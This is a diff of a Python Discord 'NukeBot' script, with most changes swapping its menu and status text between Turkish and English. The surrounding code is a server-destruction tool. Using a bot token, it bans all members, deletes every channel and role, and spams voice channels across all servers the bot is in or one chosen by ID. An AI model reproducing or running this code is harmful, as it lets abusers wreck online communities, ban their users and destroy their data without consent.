@@ -21,7 +21,7 @@ baner = f'''
 {r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
 {r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
-{y}Çeviren Kişi : Jonês#0213{g} '''
+{y}Türkçe Yapan :  {g}'''
 
 
 
@@ -81,35 +81,35 @@ async def nuke_guild(guild):
     banned = await ban_all_members(guild)
     print(f'{m}Banned:{b}{banned}')
     deleted_channels = await delete_all_channel(guild)
-    print(f'{m}Kanalları Sil:{b}{deleted_channels}')
+    print(f'{m}Delete Channels:{b}{deleted_channels}')
     delete_roles = await delete_all_roles(guild)
-    print(f'{m}Rolleri Sil:{b}{delete_roles}')
+    print(f'{m}Delete Roles:{b}{delete_roles}')
     created_channels = await create_voice_channels(guild,name)
-    print(f'{m}Ses Kanalı Kur:{b}{created_channels}')
+    print(f'{m}Create Voice Channels:{b}{created_channels}')
     #created_roles = await created_roles(guild,name)
-    #print(f'{m}Rol Kur:{b}{created_roles}')
+    #print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
 
 
 while True:
     clear()
-    choice = input(f'''   
+    choice = input(f'''  
 {baner}                
 {c}--------------------------------------------
 {b}[Menu]
-    {y}└─[1] {m}- {g}Sistemi Çalıştır
-    {y}└─[2] {m}- {g}Çıkış Yap
+    {y}└─[1] {m}- {g}Ayarları Çalıştır
+    {y}└─[2] {m}- {g}Çıkış
 {y}====>{g}''')
     if choice == '1':
-        token = _input(f'{y}Bot Token Yaz Ve Enter:{g}')
-        name = _input(f'{y}Kanal Ve Rol İsimi Ne Olsun Yaz Ve Enterla:{g}')
+        token = _input(f'{y}Bot Token Yazın:{g}')
+        name = _input(f'{y}Kanal / Rol ismi yazın:{g}')
         clear()
         choice_type = _input(f'''
 {baner}                
 {c}--------------------------------------------
 {b}[Select]
-    {y}└─[1] {m}- {g}Bütün Sunucuları Yok et!
-    {y}└─[2] {m}- {g}Sadece Bir Sunucuyu Yok et! 
+    {y}└─[1] {m}- {g}Bütün Sunucuları Yok et.
+    {y}└─[2] {m}- {g}Sadece bir sunucuyu yok et.  
     {y}└─[3] {m}- {g}Çıkış
 {y}====>{g}''')
         client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
@@ -118,12 +118,12 @@ while True:
             async def on_ready():
                 print(f'''
 [+]Giriş Yapıldı {client.user.name}
-[+]Bot {len(client.guilds)} Sunucuda!''')
+[+]Bot {len(client.guilds)} Sunucuda''')
                 for guild in client.guilds:
                     await nuke_guild(guild)
                 await client.close()
         elif choice_type == '2':
-            guild_id =  _input(f'{y}Input server id:{g}')
+            guild_id =  _input(f'{y}Sunucu İD:{g}')
             @client.event
             async def on_ready():
                 for guild in client.guilds:
@@ -131,17 +131,17 @@ while True:
                         await nuke_guild(guild)
                 await client.close()
         elif choice_type == '3':
-            print(f'{dr}Exit...')
+            print(f'{dr}Çıkış...')
             exit()
         try:
             client.run(token)
-            input(Nuke bitti, menüye dönmek için enter'a basın...  ')
+            input('İşlem Tamamlandı Menüye Dömmek İstersen Enter Bas...')
         except Exception as error:
             if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
                 input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
             else:
-                input(f'{r}{error}\n{b}Geri dönmek için enter'a basın... ')
+                input(f'{r}{error}\n{b}Press enter for return...')
             continue
     elif choice == '2':
-        print(f'{dr}Çıkış...')
+        print(f'{dr}Exit...')
         exit()
